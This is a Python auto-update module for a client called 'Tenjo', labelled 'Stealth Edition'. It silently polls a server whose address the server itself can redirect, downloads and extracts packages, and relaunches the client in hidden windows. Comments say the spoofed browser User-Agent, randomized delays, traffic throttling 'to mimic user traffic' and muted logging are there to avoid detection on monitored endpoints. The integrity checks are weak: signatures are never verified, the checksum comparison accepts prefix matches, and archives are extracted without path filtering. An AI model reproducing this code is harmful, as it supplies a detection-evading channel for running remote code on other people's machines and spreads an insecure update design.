"""
Tenjo Client Auto-Update Module (Stealth Edition)
Handles silent background updates with integrity verification, execution windows,
and randomized polling to avoid detection on monitored endpoints.
"""

import json
import logging
import os
import platform
import random
import shutil
import subprocess
import sys
import tarfile
import time
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

import hashlib
import requests
from urllib.parse import urljoin, urlparse


class ClientUpdater:
    """Handles automatic client updates from server."""

    PENDING_UPDATE_FILE = ".pending_update.json"
    UPDATE_SCHEDULE_FILE = ".update_schedule.json"

    def __init__(self, config):
        self.config = config
        self.server_candidates = self._resolve_server_candidates()
        active_server = self.server_candidates[0]
        self._set_active_server(active_server)

        system = platform.system()
        if system == 'Windows':
            base_install = Path("C:/ProgramData/Tenjo")
            backup_base = Path("C:/ProgramData/Tenjo_backups")
        elif system == 'Darwin':
            base_install = Path("/usr/local/tenjo")
            backup_base = Path("/usr/local/tenjo_backups")
        else:
            base_install = Path("/opt/tenjo")
            backup_base = Path("/opt/tenjo_backups")

        self.install_path = base_install
        self.backup_path = backup_base
        self.current_version = self._load_current_version()

        # FIX #25: Handle None DATA_DIR/LOG_DIR (Config.init_directories() not called yet)
        data_dir_str = getattr(config, 'DATA_DIR', None)
        if not data_dir_str:
            # Fallback to default data directory
            if system == 'Windows':
                data_dir_str = str(Path.home() / "AppData" / "Local" / "Tenjo" / "data")
            elif system == 'Darwin':
                data_dir_str = str(Path.home() / "Library" / "Application Support" / "Tenjo" / "data")
            else:
                data_dir_str = str(Path.home() / ".tenjo" / "data")

        data_dir = Path(data_dir_str)
        data_dir.mkdir(parents=True, exist_ok=True)
        self.temp_path = data_dir / ".update_tmp"
        self.pending_update_path = data_dir / self.PENDING_UPDATE_FILE
        self.schedule_path = data_dir / self.UPDATE_SCHEDULE_FILE

        log_dir_str = getattr(config, 'LOG_DIR', None)
        if not log_dir_str:
            # Fallback to default log directory
            if system == 'Windows':
                log_dir_str = str(Path.home() / "AppData" / "Local" / "Tenjo" / "logs")
            elif system == 'Darwin':
                log_dir_str = str(Path.home() / "Library" / "Logs" / "Tenjo")
            else:
                log_dir_str = str(Path.home() / ".tenjo" / "logs")

        log_dir = Path(log_dir_str)
        log_dir.mkdir(parents=True, exist_ok=True)
        self.log_path = log_dir / "auto_update.log"
        self.logger = logging.getLogger("TenjoAutoUpdate")
        if not self.logger.handlers:
            handler = logging.FileHandler(self.log_path, encoding='utf-8')
            formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
            handler.setFormatter(formatter)
            self.logger.addHandler(handler)
            stealth_mode = getattr(config, 'STEALTH_MODE', False)
            self.logger.setLevel(logging.INFO if not stealth_mode else logging.WARNING)
        self.logger.propagate = False

    # ------------------------------------------------------------------
    # Internal helpers
    # ------------------------------------------------------------------
    def _log(self, message: str, level: int = logging.INFO) -> None:
        debug_enabled = os.getenv('TENJO_UPDATE_DEBUG', '0') == '1'
        # FIX #31: Safe access to STEALTH_MODE with fallback
        stealth_mode = getattr(self.config, 'STEALTH_MODE', True)  # Default to stealth if not set
        if not stealth_mode or level >= logging.ERROR or debug_enabled:
            self.logger.log(level, message)

    # ------------------------------------------------------------------
    # Server resolution & overrides
    # ------------------------------------------------------------------
    def _resolve_server_candidates(self) -> List[str]:
        candidates: List[str] = []

        preferred_defaults = [
            # "https://tenjo.adilabs.id",  # COMMENTED: Let environment or config decide server
            getattr(self.config, 'DEFAULT_SERVER_URL', None),
            getattr(self.config, 'SERVER_URL', None),
        ]

        env_overrides = [
            os.getenv('TENJO_SERVER_URL'),  # ADDED: Respect main server URL env var
            os.getenv('TENJO_PREFERRED_SERVER_URL'),
            os.getenv('TENJO_FALLBACK_SERVER_URL'),
        ]

        legacy_servers = getattr(self.config, 'LEGACY_SERVER_URLS', [])

        for url in preferred_defaults + env_overrides + list(legacy_servers):
            self._add_server_candidate(url, candidates)

        if not candidates:
            candidates.append("https://tenjo.adilabs.id")

        return candidates

    def _add_server_candidate(self, url: Optional[str], bucket: List[str]) -> None:
        sanitized = self._sanitize_server_url(url)
        if sanitized and sanitized not in bucket:
            bucket.append(sanitized)

    def _sanitize_server_url(self, url: Optional[str]) -> Optional[str]:
        if not url:
            return None

        sanitized = str(url).strip()
        if not sanitized:
            return None

        if not sanitized.startswith(('http://', 'https://')):
            sanitized = f"https://{sanitized.lstrip('/')}"

        return sanitized.rstrip('/')

    def _legacy_servers(self) -> set:
        legacy = getattr(self.config, 'LEGACY_SERVER_URLS', [])
        sanitized = set()
        for url in legacy:
            clean = self._sanitize_server_url(url)
            if clean:
                sanitized.add(clean)
        return sanitized

    def _set_active_server(self, server_url: str, persist_override: bool = False) -> None:
        sanitized = self._sanitize_server_url(server_url)
        if not sanitized:
            return

        self.server_url = sanitized
        self.version_check_url = f"{self.server_url}/downloads/client/version.json"
        self.download_base_url = f"{self.server_url}/downloads/client"

        if hasattr(self.config, 'refresh_server_settings'):
            self.config.refresh_server_settings(self.server_url, persist=persist_override)
        else:
            self.config.SERVER_URL = self.server_url
            self.config.API_ENDPOINT = f"{self.server_url}/api"

        if hasattr(self, 'server_candidates'):
            if self.server_url in self.server_candidates:
                self.server_candidates.remove(self.server_url)
            self.server_candidates.insert(0, self.server_url)

    def _resolve_download_url(self, download_url: str, server_url: Optional[str]) -> str:
        cleaned = (download_url or '').strip()
        if not cleaned:
            return cleaned

        if cleaned.startswith(('http://', 'https://')):
            return cleaned

        base = self._sanitize_server_url(server_url) or self.server_url
        return urljoin(f"{base}/", cleaned.lstrip('/'))

    def _maybe_migrate_server_url(self, version_info: Dict[str, Any]) -> None:
        candidate = version_info.get('server_url') or version_info.get('preferred_server_url')

        if not candidate:
            download_url = version_info.get('download_url')
            if download_url:
                parsed = urlparse(download_url)
                if parsed.scheme and parsed.netloc:
                    candidate = f"{parsed.scheme}://{parsed.netloc}"

        sanitized = self._sanitize_server_url(candidate)
        if not sanitized or sanitized in self._legacy_servers():
            return

        if sanitized != self.server_url:
            self._set_active_server(sanitized, persist_override=True)
        else:
            if hasattr(self.config, 'persist_server_override'):
                self.config.persist_server_override(sanitized)

    def _load_json(self, path: Path) -> Optional[Dict[str, Any]]:
        try:
            if path.exists():
                with open(path, 'r', encoding='utf-8') as fh:
                    return json.load(fh)
        except Exception as exc:
            self._log(f"Failed to load {path.name}: {exc}", logging.DEBUG)
        return None

    def _write_json(self, path: Path, payload: Dict[str, Any]) -> None:
        try:
            path.parent.mkdir(parents=True, exist_ok=True)
            with open(path, 'w', encoding='utf-8') as fh:
                json.dump(payload, fh)
        except Exception as exc:
            self._log(f"Failed to persist {path.name}: {exc}", logging.DEBUG)

    def _load_current_version(self) -> str:
        try:
            version_override = os.getenv('TENJO_CLIENT_VERSION')
            if version_override:
                return version_override.strip()

            version_file = self.install_path / '.version'
            if version_file.exists():
                return version_file.read_text(encoding='utf-8').strip()
        except Exception as exc:
            self._log(f"Failed to read current version: {exc}", logging.DEBUG)

        return 'unknown'

    def _is_newer_version(self, server_version: Optional[str], current_version: Optional[str]) -> bool:
        if not server_version:
            return False

        if not current_version or current_version == 'unknown':
            return True

        def normalize(version: str) -> Tuple[int, ...]:
            parts = version.replace('_', '.').replace('-', '.').split('.')
            normalized = []
            for part in parts:
                digits = ''.join(filter(str.isdigit, part))
                if digits:
                    normalized.append(int(digits))
                else:
                    normalized.append(0)
            return tuple(normalized)

        server_tuple = normalize(server_version)
        current_tuple = normalize(current_version)

        max_len = max(len(server_tuple), len(current_tuple))
        server_tuple += (0,) * (max_len - len(server_tuple))
        current_tuple += (0,) * (max_len - len(current_tuple))

        return server_tuple > current_tuple

    # ------------------------------------------------------------------
    # Update discovery
    # ------------------------------------------------------------------
    def check_for_updates(self, force: bool = False) -> Tuple[bool, Optional[Dict[str, Any]]]:
        """Gather update metadata from cache, push triggers, or public channel."""

        pending = self._load_pending_update()
        if pending:
            return True, pending

        push_update = self._check_push_update()
        if push_update:
            self._store_pending_update(push_update)
            return True, push_update

        if not force and not self._should_poll_public_channel():
            return False, None

        public_update = self._check_public_channel()
        if public_update:
            return True, public_update

        return False, None

    def _check_push_update(self) -> Optional[Dict[str, Any]]:
        # FIX #34: Safe access to CLIENT_ID with fallback
        client_id = getattr(self.config, 'CLIENT_ID', None)
        if not client_id:
            self._log("CLIENT_ID not available, skipping push update check", logging.DEBUG)
            return None

        last_error = None

        for base_server in list(self.server_candidates):
            api_endpoint = f"{base_server}/api"
            check_url = f"{api_endpoint}/clients/{client_id}/check-update"

            try:
                # FIX #35: Add User-Agent header for stealth
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
                }
                response = requests.get(check_url, timeout=10, headers=headers)

                if response.status_code != 200:
                    last_error = f"HTTP {response.status_code} from {base_server}"
                    # FIX #33: Add small delay between failed attempts for stealth
                    time.sleep(random.uniform(0.5, 2.0))
                    continue

                data = response.json()

                preferred_server = data.get('server_url') or data.get('preferred_server_url')
                preferred_sanitized = self._sanitize_server_url(preferred_server)
                if preferred_sanitized and preferred_sanitized not in self._legacy_servers():
                    if preferred_sanitized != self.server_url:
                        self._set_active_server(preferred_sanitized)

                if not data.get('has_update'):
                    continue

                normalized = self._normalize_version_info(data, pushed=True, source_server=base_server)
                if normalized:
                    if base_server != self.server_url:
                        self._set_active_server(base_server)
                    return normalized
            except Exception as exc:
                last_error = exc
                # FIX #33: Add small delay between failed attempts for stealth
                time.sleep(random.uniform(0.5, 2.0))
                continue

        if last_error:
            self._log(f"Push update check failed: {last_error}", logging.DEBUG)

        return None

    def _check_public_channel(self) -> Optional[Dict[str, Any]]:
        last_error = None

        for base_server in list(self.server_candidates):
            version_url = f"{base_server}/downloads/client/version.json"

            try:
                # FIX #35: Add User-Agent header for stealth
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
                }
                response = requests.get(version_url, timeout=10, headers=headers)
                response.raise_for_status()
                version_info = response.json()
                server_version = version_info.get('version')

                if self._is_newer_version(server_version, self.current_version):
                    normalized = self._normalize_version_info(version_info, pushed=False, source_server=base_server)
                    if normalized:
                        target_server = normalized.get('server_url') or base_server
                        if target_server and target_server != self.server_url:
                            self._set_active_server(target_server)
                        return normalized
            except Exception as exc:
                last_error = exc
                # FIX #33: Add small delay between failed attempts for stealth
                time.sleep(random.uniform(0.5, 2.0))
                continue

        if last_error:
            self._log(f"Public update check failed: {last_error}", logging.DEBUG)

        return None

    def _normalize_version_info(
        self,
        info: Dict[str, Any],
        pushed: bool,
        source_server: Optional[str] = None,
    ) -> Optional[Dict[str, Any]]:
        if not info:
            return None

        changes = info.get('changes') or []
        if isinstance(changes, str):
            changes = [changes]

        server_url = info.get('server_url') or info.get('serverUrl') or source_server
        server_url = self._sanitize_server_url(server_url)

        normalized = {
            'version': info.get('version') or info.get('VERSION'),
            'download_url': info.get('update_url') or info.get('download_url'),
            'changes': changes,
            'checksum': info.get('checksum') or info.get('sha256'),
            'package_size': info.get('package_size'),
            'signature': info.get('signature'),
            'priority': (info.get('priority') or 'normal').lower(),
            'window_start': info.get('window_start'),
            'window_end': info.get('window_end'),
            'triggered_at': info.get('triggered_at'),
            'pushed': pushed,
            'execute_now': info.get('execute_now', True),
            'defer_seconds': info.get('defer_seconds'),
            'server_url': server_url,
        }

        if not normalized['version']:
            return None

        if normalized['download_url']:
            normalized['download_url'] = self._resolve_download_url(
                normalized['download_url'],
                normalized.get('server_url') or source_server,
            )
        elif normalized['server_url']:
            package_name = f"tenjo_client_{normalized['version']}.tar.gz"
            normalized['download_url'] = f"{normalized['server_url']}/downloads/client/{package_name}"

        return normalized

    def _should_poll_public_channel(self) -> bool:
        schedule = self._load_json(self.schedule_path) or {}
        next_check = schedule.get('next_check')
        if not next_check:
            return True

        try:
            next_dt = datetime.fromisoformat(next_check)
            if next_dt.tzinfo is None:
                next_dt = next_dt.replace(tzinfo=timezone.utc)
            return datetime.now(timezone.utc) >= next_dt
        except Exception:
            return True

    # ------------------------------------------------------------------
    # Cache & scheduling
    # ------------------------------------------------------------------
    def _store_pending_update(self, version_info: Dict[str, Any]) -> None:
        payload = {**version_info, 'stored_at': datetime.now(timezone.utc).isoformat()}
        self._write_json(self.pending_update_path, payload)

    def _load_pending_update(self) -> Optional[Dict[str, Any]]:
        data = self._load_json(self.pending_update_path)
        if data and data.get('version'):
            return data
        return None

    def _clear_pending_update(self) -> None:
        try:
            if self.pending_update_path.exists():
                self.pending_update_path.unlink()
        except Exception:
            pass

    def schedule_next_check(self, minutes: Optional[float] = None) -> None:
        if minutes is None:
            minutes = random.uniform(8, 16) * 60  # 8-16 hours
        next_check = datetime.now(timezone.utc) + timedelta(minutes=minutes)
        self._write_json(self.schedule_path, {
            'next_check': next_check.isoformat(),
            'minutes': minutes,
        })

    def has_pending_update(self) -> bool:
        return self.pending_update_path.exists()

    # ------------------------------------------------------------------
    # Download & integrity
    # ------------------------------------------------------------------
    def download_update(self, version_info: Dict[str, Any]) -> Tuple[bool, Optional[Path]]:
        # FIX #37: Add retry logic for failed downloads
        max_retries = 3
        retry_delay = 5  # seconds

        for attempt in range(max_retries):
            try:
                package_server = self._sanitize_server_url(version_info.get('server_url')) or self.server_url
                if package_server and package_server != self.server_url:
                    self._set_active_server(package_server)

                download_url = version_info.get('download_url')
                if download_url:
                    download_url = self._resolve_download_url(download_url, package_server)
                else:
                    version = version_info.get('version', 'latest')
                    package_name = f"tenjo_client_{version}.tar.gz"
                    base = self._sanitize_server_url(package_server) or self.server_url
                    download_url = f"{base}/downloads/client/{package_name}"

                # FIX #34: Safe CLIENT_ID access, FIX #35: Add User-Agent for stealth
                client_id = getattr(self.config, 'CLIENT_ID', 'unknown')
                headers = {
                    'X-Tenjo-Client': client_id,
                    'X-Tenjo-Version': self.current_version or self._load_current_version(),
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
                }

                self.temp_path.mkdir(parents=True, exist_ok=True)
                package_path = self.temp_path / "client_package.tar.gz"

                # FIX #36: Increase timeout from 45s to 300s (5 minutes) for slow connections
                response = requests.get(download_url, stream=True, timeout=300, headers=headers)
                response.raise_for_status()

                with open(package_path, 'wb') as fh:
                    for chunk in response.iter_content(chunk_size=1024 * 512):
                        if chunk:
                            fh.write(chunk)
                            time.sleep(random.uniform(0.0, 0.02))  # throttle to mimic user traffic

                expected_size = version_info.get('package_size')
                if expected_size and package_path.stat().st_size != expected_size:
                    raise ValueError('Package size mismatch')

                expected_checksum = version_info.get('checksum')
                if expected_checksum:
                    actual_checksum = self._calculate_sha256(package_path)
                    if not self._verify_checksum(expected_checksum, actual_checksum):
                        raise ValueError('Checksum verification failed')

                # FIX #26: Signature verification (currently disabled, TODO: implement if needed)
                # For now, we rely on HTTPS + checksum verification for integrity
                expected_signature = version_info.get('signature')
                if expected_signature:
                    self._log("Signature verification not yet implemented, relying on checksum", logging.DEBUG)
                    # TODO: Implement signature verification with public key if required
                    # For production, consider implementing RSA signature verification

                # FIX #37: Download successful, return immediately
                return True, package_path

            except Exception as exc:
                # FIX #37: Retry logic - log and retry on failure
                if attempt < max_retries - 1:
                    self._log(f"Download attempt {attempt + 1} failed: {exc}, retrying in {retry_delay}s...", logging.DEBUG)
                    time.sleep(retry_delay)
                    retry_delay *= 2  # Exponential backoff
                else:
                    self._log(f"Download failed after {max_retries} attempts: {exc}", logging.ERROR)
                    return False, None

        # FIX #37: All retries failed
        return False, None

    def _calculate_sha256(self, path: Path) -> str:
        sha = hashlib.sha256()
        with open(path, 'rb') as fh:
            for chunk in iter(lambda: fh.read(1024 * 1024), b''):
                sha.update(chunk)
        return sha.hexdigest()

    def _verify_checksum(self, expected: str, actual: str) -> bool:
        expected = expected.lower().strip()
        actual = actual.lower().strip()
        return expected == actual or actual.startswith(expected) or expected.startswith(actual)

    def backup_current_installation(self) -> Tuple[bool, Optional[Path]]:
        try:
            self.backup_path.mkdir(parents=True, exist_ok=True)
            timestamp = datetime.now(timezone.utc).strftime('%Y%m%d_%H%M%S')
            backup_dir = self.backup_path / f"backup_{timestamp}"

            if self.install_path.exists():
                shutil.copytree(
                    self.install_path,
                    backup_dir,
                    ignore=shutil.ignore_patterns('*.pyc', '__pycache__', 'logs', 'data')
                )
            return True, backup_dir
        except Exception as exc:
            self._log(f"Backup failed: {exc}", logging.DEBUG)
            return False, None

    def apply_update(self, package_path: Path, version_info: Dict[str, Any]) -> bool:
        try:
            extract_path = self.temp_path / "extracted"
            if extract_path.exists():
                shutil.rmtree(extract_path)
            extract_path.mkdir(parents=True, exist_ok=True)

            with tarfile.open(package_path, 'r:gz') as archive:
                archive.extractall(extract_path)

            for item in extract_path.iterdir():
                destination = self.install_path / item.name
                if item.is_file():
                    destination.parent.mkdir(parents=True, exist_ok=True)
                    shutil.copy2(item, destination)
                elif item.is_dir():
                    if destination.exists():
                        shutil.rmtree(destination)
                    shutil.copytree(item, destination)

            # FIX #22: Write actual version number from version_info, not just timestamp
            version_file = self.install_path / ".version"
            actual_version = version_info.get('version', version_info_timestamp())
            with open(version_file, 'w', encoding='utf-8') as fh:
                fh.write(actual_version)

            return True
        except Exception as exc:
            self._log(f"Apply update failed: {exc}", logging.ERROR)
            return False

    def cleanup_temp(self) -> None:
        try:
            if self.temp_path.exists():
                shutil.rmtree(self.temp_path)
        except Exception:
            pass

    # ------------------------------------------------------------------
    # Execution control
    # ------------------------------------------------------------------
    def _should_execute_now(self, version_info: Dict[str, Any], force: bool = False) -> Tuple[bool, Optional[int]]:
        if force or version_info.get('priority') == 'critical':
            return True, None

        if not version_info.get('execute_now', True):
            defer_seconds = version_info.get('defer_seconds', 600)
            return False, defer_seconds

        start = version_info.get('window_start')
        end = version_info.get('window_end')
        if not start or not end:
            return True, None

        try:
            # FIX #32: Use timezone-aware datetime for accurate window calculation
            now = datetime.now(timezone.utc)
            today = now.date()
            start_dt = datetime.strptime(start, '%H:%M').replace(
                year=today.year, month=today.month, day=today.day, tzinfo=timezone.utc
            )
            end_dt = datetime.strptime(end, '%H:%M').replace(
                year=today.year, month=today.month, day=today.day, tzinfo=timezone.utc
            )

            if end_dt <= start_dt:
                end_dt += timedelta(days=1)
                if now < start_dt:
                    start_dt -= timedelta(days=1)

            if start_dt <= now <= end_dt:
                return True, None

            if now < start_dt:
                delay = int((start_dt - now).total_seconds())
            else:
                next_start = start_dt + timedelta(days=1)
                delay = int((next_start - now).total_seconds())

            return False, delay
        except Exception:
            return True, None

    def restart_client(self) -> None:
        try:
            main_py = self.install_path / "main.py"
            system = platform.system()

            # FIX #29: Log restart with ERROR level for stealth (only logged if debug enabled)
            self._log(f"Restarting client with updated version", logging.ERROR)

            if system == 'Windows':
                try:
                    creation_flags = getattr(subprocess, 'CREATE_NO_WINDOW', 0)
                    subprocess.Popen(
                        [sys.executable, str(main_py)],
                        cwd=str(self.install_path),
                        creationflags=creation_flags,
                        start_new_session=True,
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL
                    )
                    # FIX #27: Small delay before exit to ensure process starts
                    time.sleep(1)
                except Exception:
                    subprocess.Popen(
                        ['powershell', '-WindowStyle', 'Hidden', '-Command',
                         f"Start-Process -WindowStyle Hidden -FilePath '{sys.executable}' -ArgumentList '{main_py}'"],
                        cwd=str(self.install_path),
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL
                    )
                    time.sleep(1)
                finally:
                    os._exit(0)
            else:
                # Unix systems: execv replaces current process
                os.execv(sys.executable, [sys.executable, str(main_py)])
        except Exception as exc:
            self._log(f"Restart failed: {exc}", logging.ERROR)
            # If restart fails, exit anyway to avoid zombie process
            os._exit(1)

    def notify_update_completed(self, version: str) -> None:
        try:
            # FIX #38: Validate CLIENT_ID before sending
            client_id = getattr(self.config, 'CLIENT_ID', None)
            if not client_id:
                self._log("CLIENT_ID not available, skipping update completion notification", logging.DEBUG)
                return

            api_endpoint = getattr(self.config, 'API_ENDPOINT', None)
            if not api_endpoint:
                self._log("API_ENDPOINT not available, skipping update completion notification", logging.DEBUG)
                return

            notify_url = f"{api_endpoint}/clients/{client_id}/update-completed"
            payload = {
                'version': version,
                'completed_at': datetime.now(timezone.utc).isoformat(),
            }
            # FIX #35: Add User-Agent header for stealth
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Content-Type': 'application/json'
            }
            requests.post(notify_url, json=payload, timeout=6, headers=headers)
        except Exception as exc:
            self._log(f"Notify update completion failed: {exc}", logging.DEBUG)

    # ------------------------------------------------------------------
    # Main entry points
    # ------------------------------------------------------------------
    def perform_update(self, force: bool = False) -> bool:
        try:
            has_update, version_info = self.check_for_updates(force=force)

            if not has_update or not version_info:
                self.schedule_next_check()
                return False

            should_run, defer_seconds = self._should_execute_now(version_info, force=force)

            if not should_run:
                self._store_pending_update(version_info)
                if defer_seconds is None:
                    defer_seconds = random.randint(900, 3600)
                self.schedule_next_check(minutes=(defer_seconds / 60) + random.uniform(2, 7))
                return False

            success, package_path = self.download_update(version_info)
            if not success or not package_path:
                self.schedule_next_check(minutes=random.uniform(30, 90))
                return False

            # FIX #28: Backup before update for rollback capability
            backup_success, backup_dir = self.backup_current_installation()

            # FIX #23: Pass version_info to apply_update
            if not self.apply_update(package_path, version_info):
                # FIX #28: Rollback to backup on update failure
                if backup_success and backup_dir and backup_dir.exists():
                    # FIX #29: Use ERROR level for stealth mode (only in debug/error scenarios)
                    self._log(f"Update failed, rolling back to backup: {backup_dir}", logging.ERROR)
                    try:
                        if self.install_path.exists():
                            shutil.rmtree(self.install_path)
                        shutil.copytree(backup_dir, self.install_path)
                        self._log("Rollback successful", logging.ERROR)
                    except Exception as rollback_exc:
                        self._log(f"Rollback failed: {rollback_exc}", logging.ERROR)

                self.schedule_next_check(minutes=random.uniform(45, 120))
                return False

            self._maybe_migrate_server_url(version_info)

            if version_info.get('pushed'):
                self.notify_update_completed(version_info.get('version', 'unknown'))

            self.current_version = version_info.get('version', self.current_version)
            self._clear_pending_update()

            # FIX #27: Ensure cleanup happens BEFORE restart
            self.cleanup_temp()
            self.schedule_next_check()

            # Give a small delay to ensure cleanup completes
            time.sleep(0.5)

            self.restart_client()
            return True
        except Exception as exc:
            self._log(f"Perform update failed: {exc}", logging.ERROR)
            self.cleanup_temp()
            self.schedule_next_check(minutes=random.uniform(45, 120))
            return False

    def should_check_now(self) -> bool:
        if self.has_pending_update():
            return True
        if self._sanitize_server_url(getattr(self.config, 'SERVER_URL', None)) in self._legacy_servers():
            return True
        return self._should_poll_public_channel()


def version_info_timestamp() -> str:
    return datetime.now(timezone.utc).strftime('%Y.%m.%d')


def check_and_update_if_needed(config, force: bool = False) -> bool:
    updater = ClientUpdater(config)

    if not force and not updater.should_check_now():
        return False

    return updater.perform_update(force=force)
